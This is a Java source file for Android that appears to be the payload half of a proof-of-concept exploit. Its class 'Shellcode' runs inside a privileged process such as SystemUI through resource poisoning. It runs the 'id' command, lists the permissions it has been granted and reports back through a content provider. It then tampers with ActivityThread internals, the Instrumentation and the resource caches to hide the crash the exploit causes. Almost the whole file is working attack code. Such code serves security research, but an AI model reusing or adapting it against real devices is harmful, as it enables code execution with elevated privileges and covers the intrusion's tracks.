package com.example.resourcepoison;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AppComponentFactory;
import android.app.Instrumentation;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PermissionInfo;
import android.os.IBinder;
import android.os.Looper;
import android.os.Process;
import android.util.Log;

import androidx.annotation.NonNull;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.ref.WeakReference;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.stream.Collectors;

public class Shellcode extends AppComponentFactory {
    static boolean sDone;
    private Context mContext;
    private Class<?> mAtClass;
    private Object mAtInstance;

    public Shellcode() throws Exception {
        Log.e("ResPoison", "SHELLCODE EXECUTED IN UID " + Process.myUid());

        if (sDone) return;
        sDone = true;

        mAtClass = Class.forName("android.app.ActivityThread");
        mAtInstance = mAtClass.getMethod("currentActivityThread").invoke(null);
        mContext = (Context) mAtClass.getMethod("currentApplication").invoke(null);
        sendToUi("Shellcode executed in uid=" + Process.myUid() +
                " pid=" + Process.myPid() +
                " package=" + mContext.getPackageName());
        cleanUpAfterExploitation();
        sendToUi(getId());
        sendToUi("Granted permissions:\n" + String.join("\n", getGrantedPermissions()));
    }

    @NonNull
    private ArrayList<String> getGrantedPermissions() {
        HashSet<String> permissionsSet = new HashSet<>();
        for (PackageInfo aPackage : mContext.getPackageManager().getInstalledPackages(PackageManager.GET_PERMISSIONS)) {
            if (aPackage.permissions != null) {
                for (PermissionInfo permission : aPackage.permissions) {
                    permissionsSet.add(permission.name);
                }
            }
        }
        ArrayList<String> permissionsList = new ArrayList<>();
        for (String permission : permissionsSet) {
            if (mContext.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED) {
                permissionsList.add(permission);
            }
        }
        permissionsList.sort(null);
        return permissionsList;
    }

    void sendToUi(String message) {
        mContext.getContentResolver().call(
                "com.example.resourcepoison.provider",
                "shellcode_report",
                message,
                null
        );
    }

    static String getId() {
        try {
            return new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("id").getInputStream())).readLine();
        } catch (IOException e) {
            e.printStackTrace();
            return "uid=" + Process.myUid() + ". Execution of id command failed";
        }
    }

    @SuppressLint("SoonBlockedPrivateApi")
    void cleanUpAfterExploitation() throws Exception {
        // Skip Exception thrown from SlicePermissionActivity.onCreate
        // by injecting our Instrumentation
        Field instrField = mAtClass.getDeclaredField("mInstrumentation");
        instrField.setAccessible(true);
        Instrumentation origInstrumentation = (Instrumentation) instrField.get(mAtInstance);
        Runnable[] resourceCacheBak = new Runnable[1];
        Instrumentation myInstrumentation = new Instrumentation() {
            @Override
            public boolean onException(Object obj, Throwable e) {
                try {
                    // Restore original Instrumentation
                    instrField.set(mAtInstance, origInstrumentation);

                    // Restore resource cache (stop NullPointerException)
                    Runnable restoreRunnable = resourceCacheBak[0];
                    if (restoreRunnable != null) {
                        restoreRunnable.run();
                    }

                    // Mark activity as created (so onCreate won't be retried again despite crash)
                    Activity activity = (Activity) obj;
                    Object r = mAtClass.getMethod("getActivityClient", IBinder.class).invoke(mAtInstance, Activity.class.getMethod("getActivityToken").invoke(activity));
                    r.getClass().getMethod("setState", int.class).invoke(r, 1);

                    // Finish activity
                    activity.finish();

                    // Clear fake resources
                    clearFakeResources("mPackages");
                    clearFakeResources("mResourcePackages");
                    Class.forName("android.app.LoadedApk").getMethod("checkAndUpdateApkPaths", ApplicationInfo.class).invoke(
                            null,
                            mContext.getPackageManager().getApplicationInfo("com.android.systemui", 0)
                    );
                } catch (ReflectiveOperationException | PackageManager.NameNotFoundException ex) {
                    throw new RuntimeException(ex);
                }
                return true;
            }
        };
        for (Field field : Instrumentation.class.getDeclaredFields()) {
            field.setAccessible(true);
            field.set(myInstrumentation, field.get(origInstrumentation));
        }
        instrField.set(mAtInstance, myInstrumentation);
        // Stop resource loading
        // by setting mCachedApkAssets to null so loadApkAssets throws NullPointerException
        Class<?> rmClass = Class.forName("android.app.ResourcesManager");
        Object rmInstance = rmClass.getMethod("getInstance").invoke(null);
        Field rmCacheField = rmClass.getDeclaredField("mCachedApkAssets");
        rmCacheField.setAccessible(true);
        Object rmOrigCache = rmCacheField.get(rmInstance);
        resourceCacheBak[0] = () -> {
            try {
                rmCacheField.set(rmInstance, rmOrigCache);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e);
            }
        };
        rmCacheField.set(rmInstance, null);
    }

    void clearFakeResources(String fieldName) throws ReflectiveOperationException {
        Field field = mAtClass.getDeclaredField(fieldName);
        field.setAccessible(true);
        Map<String, ?> map = (Map<String, ?>) field.get(mAtInstance);
        ArrayList<Map.Entry> entries = new ArrayList<>();
        for (Map.Entry<String, ?> entry : map.entrySet()) {
            // MapCollections.EntrySet doesn't support toArray
            //noinspection UseBulkOperation
            entries.add(entry);
        }
        for (Map.Entry<String, WeakReference<?>> entry : entries) {
            WeakReference weakValue = entry.getValue();
            if (weakValue == null) continue;
            Object value = weakValue.get();
            if (value == null) continue;
            ApplicationInfo appInfo = (ApplicationInfo) value.getClass().getMethod("getApplicationInfo").invoke(value);
            if (!"/dev/random".equals(ApplicationInfo.class.getDeclaredField("scanSourceDir").get(appInfo))) continue;
            if ("com.android.systemui".equals(appInfo.packageName)) {
                ApplicationInfo.class.getDeclaredField("createTimestamp").setLong(appInfo, 0);
            } else {
                map.remove(entry);
            }
        }
    }
}
